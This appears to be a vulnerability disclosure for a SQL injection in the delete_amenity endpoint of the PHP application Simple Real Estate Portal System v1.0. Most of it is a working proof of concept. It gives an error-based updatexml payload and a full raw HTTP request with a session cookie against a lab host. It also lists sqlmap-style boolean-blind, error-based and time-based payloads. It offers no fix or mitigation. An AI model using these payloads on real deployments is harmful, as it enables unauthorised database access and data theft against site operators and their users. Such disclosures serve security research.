## Simple Real Estate Portal System v1.0 has a SQL injection vulnerability

vendors: https://www.sourcecodester.com/php/15184/simple-real-estate-portal-system-phpoop-free-source-code.html

Vulnerability file: /reps/classes/Master.php?f=delete_amenity

Vulnerability location: /reps/classes/Master.php?f=delete_amenity , id

[+] Payload: id=7' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ //id is Injection point 

```
POST /reps/classes/Master.php?f=delete_amenity HTTP/1.1
Host: 192.168.1.19
Content-Length: 65
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/reps/admin/?page=amenities
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=b7n0d4rju88m3p50kmalnvn6ti
Connection: close

id=7' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ //id is Injection point
```

![image](https://user-images.githubusercontent.com/54017627/160310392-e3bb194b-07ee-4934-8cff-e17f01e3408c.png)

```sql
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=7' RLIKE (SELECT (CASE WHEN (8101=8101) THEN 7 ELSE 0x28 END))-- gXyQ

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=7' AND (SELECT 6381 FROM(SELECT COUNT(*),CONCAT(0x7170787a71,(SELECT (ELT(6381=6381,1))),0x716b6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LaZi

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=7' AND (SELECT 2258 FROM (SELECT(SLEEP(5)))pvPg)-- dMCC
---
```
![image](https://user-images.githubusercontent.com/54017627/160310243-07e9650b-126c-4d59-99d9-07c81991610c.png)
